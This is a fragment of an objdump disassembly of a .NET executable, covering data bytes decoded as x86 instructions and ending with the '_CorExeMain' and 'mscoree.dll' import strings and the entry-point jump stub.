  40cf96:	07                   	pop    %es
  40cf97:	05 08 08 0e 15       	add    $0x150e0808,%eax
  40cf9c:	11 81 d9 01 12 60    	adc    %eax,0x601201d9(%ecx)
  40cfa2:	12 60 07             	adc    0x7(%eax),%ah
  40cfa5:	07                   	pop    %es
  40cfa6:	04 08                	add    $0x8,%al
  40cfa8:	05 1d 05 08 04       	add    $0x408051d,%eax
  40cfad:	20 01                	and    %al,(%ecx)
  40cfaf:	01 05 04 07 01 11    	add    %eax,0x11010704
  40cfb5:	64 04 00             	fs add $0x0,%al
  40cfb8:	01 0b                	add    %ecx,(%ebx)
  40cfba:	0a 04 00             	or     (%eax,%eax,1),%al
  40cfbd:	01 0b                	add    %ecx,(%ebx)
  40cfbf:	0e                   	push   %cs
  40cfc0:	04 00                	add    $0x0,%al
  40cfc2:	01 0b                	add    %ecx,(%ebx)
  40cfc4:	0d 04 00 01 0b       	or     $0xb010004,%eax
  40cfc9:	0c 06                	or     $0x6,%al
  40cfcb:	00 01                	add    %al,(%ecx)
  40cfcd:	0b 11                	or     (%ecx),%edx
  40cfcf:	81 ad 04 00 01 0a 0a 	subl   $0x100040a,0xa010004(%ebp)
  40cfd6:	04 00 01 
  40cfd9:	0a 0e                	or     (%esi),%cl
  40cfdb:	04 00                	add    $0x0,%al
  40cfdd:	01 0a                	add    %ecx,(%edx)
  40cfdf:	0d 04 00 01 0a       	or     $0xa010004,%eax
  40cfe4:	0c 06                	or     $0x6,%al
  40cfe6:	00 01                	add    %al,(%ecx)
  40cfe8:	0a 11                	or     (%ecx),%dl
  40cfea:	81 ad 04 00 01 0d 0a 	subl   $0x100040a,0xd010004(%ebp)
  40cff1:	04 00 01 
  40cff4:	0d 0e 07 07 02       	or     $0x207070e,%eax
  40cff9:	11 64 11 81          	adc    %esp,-0x7f(%ecx,%edx,1)
  40cffd:	ad                   	lods   %ds:(%esi),%eax
  40cffe:	05 00 01 1d 05       	add    $0x51d0100,%eax
  40d003:	0c 07                	or     $0x7,%al
  40d005:	07                   	pop    %es
  40d006:	02 1d 05 12 81 71    	add    0x71811205,%bl
  40d00c:	0d 20 04 01 0e       	or     $0xe010420,%eax
  40d011:	11 81 75 11 82 61    	adc    %eax,0x61821175(%ecx)
  40d017:	11 82 65 0b 07 06    	adc    %eax,0x6070b65(%edx)
  40d01d:	12 60 1d             	adc    0x1d(%eax),%ah
  40d020:	0e                   	push   %cs
  40d021:	0e                   	push   %cs
  40d022:	08 12                	or     %dl,(%edx)
  40d024:	60                   	pusha
  40d025:	08 05 07 01 12 81    	or     %al,0x81120107
  40d02b:	2d 05 07 01 12       	sub    $0x12010705,%eax
  40d030:	81 71 07 07 04 05 1d 	xorl   $0x1d050407,0x7(%ecx)
  40d037:	05 08 08 06 00       	add    $0x60808,%eax
  40d03c:	02 07                	add    (%edi),%al
  40d03e:	1d 05 08 06 00       	sbb    $0x60805,%eax
  40d043:	02 0c 1d 05 08 06 00 	add    0x60805(,%ebx,1),%cl
  40d04a:	02 0d 1d 05 08 06    	add    0x608051d,%cl
  40d050:	00 02                	add    %al,(%edx)
  40d052:	09 1d 05 08 06 00    	or     %ebx,0x60805
  40d058:	02 0b                	add    (%ebx),%cl
  40d05a:	1d 05 08 06 00       	sbb    $0x60805,%eax
  40d05f:	02 06                	add    (%esi),%al
  40d061:	1d 05 08 06 00       	sbb    $0x60805,%eax
  40d066:	02 0a                	add    (%edx),%cl
  40d068:	1d 05 08 09 07       	sbb    $0x7090805,%eax
  40d06d:	03 12                	add    (%edx),%edx
  40d06f:	81 2d 1d 05 1d 05 05 	subl   $0x12020705,0x51d051d
  40d076:	07 02 12 
  40d079:	60                   	pusha
  40d07a:	02 04 07             	add    (%edi,%eax,1),%al
  40d07d:	01 1d 05 05 07 02    	add    %ebx,0x2070505
  40d083:	1d 05 08 08 07       	sbb    $0x7080805,%eax
  40d088:	04 1d                	add    $0x1d,%al
  40d08a:	05 1d 05 08 05       	add    $0x508051d,%eax
  40d08f:	06                   	push   %es
  40d090:	07                   	pop    %es
  40d091:	03 1d 05 08 05 05    	add    0x5050805,%ebx
  40d097:	00 01                	add    %al,(%ecx)
  40d099:	1d 05 0b 0f 07       	sbb    $0x70f0b05,%eax
  40d09e:	06                   	push   %es
  40d09f:	12 81 2d 1d 05 08    	adc    0x8051d2d(%ecx),%al
  40d0a5:	12 82 69 1d 05 1d    	adc    0x1d051d69(%edx),%al
  40d0ab:	05 08 20 02 01       	add    $0x1022008,%eax
  40d0b0:	12 61 11             	adc    0x11(%ecx),%ah
  40d0b3:	82 6d 0c 07          	subb   $0x7,0xc(%ebp)
  40d0b7:	04 12                	add    $0x12,%al
  40d0b9:	81 2d 1d 05 12 82 69 	subl   $0x51d69,0x8212051d
  40d0c0:	1d 05 00 
  40d0c3:	00 ec                	add    %ch,%ah
  40d0c5:	d0 00                	rolb   $1,(%eax)
	...
  40d0cf:	00 0e                	add    %cl,(%esi)
  40d0d1:	d1 00                	roll   $1,(%eax)
  40d0d3:	00 00                	add    %al,(%eax)
  40d0d5:	20 00                	and    %al,(%eax)
	...
  40d0eb:	00 00                	add    %al,(%eax)
  40d0ed:	d1 00                	roll   $1,(%eax)
	...
  40d0ff:	00 00                	add    %al,(%eax)
  40d101:	00 5f 43             	add    %bl,0x43(%edi)
  40d104:	6f                   	outsl  %ds:(%esi),(%dx)
  40d105:	72 45                	jb     0x40d14c
  40d107:	78 65                	js     0x40d16e
  40d109:	4d                   	dec    %ebp
  40d10a:	61                   	popa
  40d10b:	69 6e 00 6d 73 63 6f 	imul   $0x6f63736d,0x0(%esi),%ebp
  40d112:	72 65                	jb     0x40d179
  40d114:	65 2e 64 6c          	gs cs fs insb (%dx),%es:(%edi)
  40d118:	6c                   	insb   (%dx),%es:(%edi)
  40d119:	00 00                	add    %al,(%eax)
  40d11b:	00 00                	add    %al,(%eax)
  40d11d:	00 ff                	add    %bh,%bh
  40d11f:	25 00 20 40 00       	and    $0x402000,%eax
